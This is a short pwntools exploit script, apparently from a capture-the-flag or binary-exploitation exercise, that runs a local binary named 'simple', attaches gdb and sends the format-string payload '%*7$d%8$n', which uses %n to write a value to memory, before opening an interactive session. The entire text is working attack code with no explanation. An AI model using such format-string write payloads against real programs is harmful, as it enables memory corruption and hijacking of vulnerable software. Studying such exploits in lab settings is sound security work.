from pwn import *

r = process('./simple')

gdb.attach(r, 'fin\n'*5+'n 3\n')
r.sendline('%*7$d%8$n')

r.interactive()